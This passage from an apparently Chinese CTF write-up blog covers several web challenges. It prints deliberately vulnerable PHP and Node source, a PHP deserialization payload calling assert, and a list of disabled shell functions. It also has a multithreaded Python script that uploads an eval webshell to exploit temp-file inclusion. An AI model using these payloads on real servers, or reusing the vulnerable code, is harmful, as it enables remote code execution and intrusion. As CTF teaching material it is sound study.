class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="web🐕"><a href="#web🐕" class="headerlink" title="web🐕"></a>web🐕</h2><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><p>查看源码发现index.bak.php</p><p>点进去之后url是<code>http://ha1cyon-ctf.fun:30094/index.bak.php?action=message.php</code></p><p>尝试使用伪协议读取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.bak.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'action'</span>];</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"location:./index.bak.php?action=message.php"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;message.php</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;static&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;X佬留言板&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">&lt;h1&gt;👴过留声 燕过留名&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;!--假的navbar--&gt;</span><br><span class="line">&lt;navbar&gt;</span><br><span class="line">&lt;ul class&#x3D;&quot;nav nav-tabs&quot;&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;nav-link &quot; href&#x3D;&quot;.&#x2F;index.php&quot;&gt;Index&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;nav-link table-active &quot; href&#x3D;&quot;.&#x2F;message.php&quot;&gt;Message&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;nav-link&quot; href&#x3D;&quot;.&#x2F;phpinfo.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;&#x2F;navbar&gt;</span><br><span class="line">&lt;!--假的navbar--&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;form id&#x3D;&quot;message-form&quot;&gt;</span><br><span class="line">&lt;textarea  id&#x3D;&quot;msg&quot; cols&#x3D;&quot;45&quot; rows&#x3D;&quot;3&quot; placeholder&#x3D;&quot;🌶你进群，还不快来👴直接把⚰都给bypass给你看信不信&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'content-type:application/json'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"msg is too loooong!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">"/php/"</span>,<span class="string">"?"</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'msg'</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))$_SESSION[<span class="string">'msg'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">'msg'</span>], [<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">'msg'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"还不快去留言！"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>查看源码发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>百万前端的NPU报时中心为您报时：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./time.php?source"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击之后得time.php到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>编写脚本经过测试，部分函数被禁用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"phpinfo()"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($c); <span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure><p>查看phpinfo被禁用如下函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</span><br></pre></td></tr></table></figure><p>后面查找发现flag在phpinfo中</p><h2 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h2><p>url前面加上 view-source:</p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>查看源码得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包发现cookie里面有一个hash，直接提交即可。</p><p>目录扫描发现了一个dir.php。</p><p>提交之后来到了/flflflflag.php，然后立马跳转到404.html。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">window</span>.location.href=<span class="string">"404.html"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET["file"])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用文件包含查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;flflflflag.php</span><br><span class="line">html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;404.html&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>经过一番查找后，考点是这个<a href="https://www.anquanke.com/post/id/183046" target="_blank" rel="noopener">PHP临时文件机制与利用的思考</a></p><p>利用<a href="https://www.anquanke.com/member/144041" target="_blank" rel="noopener">Mote</a>师傅github中的脚本<a href="https://github.com/Mote-Z/PHP-Is-The-Best/blob/master/PHP_Tempfile_Exploit/POC1/upload.py" target="_blank" rel="noopener">poc1</a>,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">'http://fa1203f5-0c7d-4e2f-8674-c614670aa93f.node3.buuoj.cn/flflflflag.php?file=flflflflag.php'</span></span><br><span class="line">files = &#123;<span class="string">'file'</span> + str(i): (<span class="string">'webshell'</span>, <span class="string">'@&lt;?php @eval($_GET[1]);?&gt;'</span> + <span class="string">'test'</span> + str(i), <span class="string">'text/php'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9,en;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            r = s.post(url=url, headers=header, files=files)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        print(<span class="string">'Connection Error'</span>)</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    workers = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        worker = threading.Thread(target=upload_file, args=())</span><br><span class="line">        worker.start()</span><br><span class="line">        workers.append(worker)</span><br><span class="line">    <span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">        worker.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>一直跑，然后在dir.php查看目录文件，再包含shell进去。</p><p><img src="/pic/166.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpylUNtT&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>发现flag在phpinfo中。</p><p><img src="/pic/166.png" alt=""></p><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" 